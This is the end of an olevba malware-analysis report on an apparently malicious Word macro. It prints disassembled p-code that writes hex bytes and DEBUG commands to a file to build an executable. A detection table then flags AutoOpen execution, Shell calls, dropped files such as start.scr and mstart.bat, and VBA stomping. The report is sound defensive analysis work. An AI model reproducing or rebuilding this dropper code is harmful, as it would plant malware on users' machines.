' Line #3683:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E DA10 03 07 00 04 07 00 00 03 03 06 0A 00 00 03 04 05"
' 	PrintItemNL 
' Line #3684:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "E DA20 09 00 00 03 00 00"
' 	PrintItemNL 
' Line #3685:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "RCX"
' 	PrintItemNL 
' Line #3686:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "D926"
' 	PrintItemNL 
' Line #3687:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "W"
' 	PrintItemNL 
' Line #3688:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "Q"
' 	PrintItemNL 
' Line #3689:
' 	Ld hFile 
' 	Close 0x0001 
' Line #3690:
' 	EndSub 
' Line #3691:
' Line #3692:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |tripp.reg           |Executable file name                         |
|IOC       |start.scr           |Executable file name                         |
|IOC       |mstart.bat          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

